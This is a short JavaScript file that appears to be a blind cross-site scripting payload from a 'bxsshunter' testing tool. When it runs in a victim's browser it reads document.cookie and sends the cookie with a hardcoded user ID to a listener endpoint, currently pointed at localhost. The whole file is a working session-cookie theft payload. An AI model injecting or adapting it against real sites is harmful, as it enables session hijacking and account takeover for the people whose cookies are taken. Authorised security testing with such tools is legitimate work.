(function () {
  console.log('BXSS payload injected.');

  // Display an alert on the admin side
  alert('BXSS payload executed.');

  // Capture the cookie and send it to the server
  var cookie = document.cookie;
  var userId = '666a5deae342af7b732c6c7c'; // Replace this with the actual user ID

  console.log('Captured Cookie:', cookie);

  var xhr = new XMLHttpRequest();
  xhr.open(
    'GET',
    'http://localhost:8000/api/bxsshunter/bxss-listener?cookie=' +
      encodeURIComponent(cookie) +
      '&userId=' +
      userId,
    true,
  );
  xhr.onload = function () {
    if (xhr.status === 200) {
      console.log('Cookie sent successfully.');
    } else {
      console.error('Failed to send cookie.');
    }
  };
  xhr.onerror = function () {
    console.error('Request error.');
  };
  xhr.send();
})();
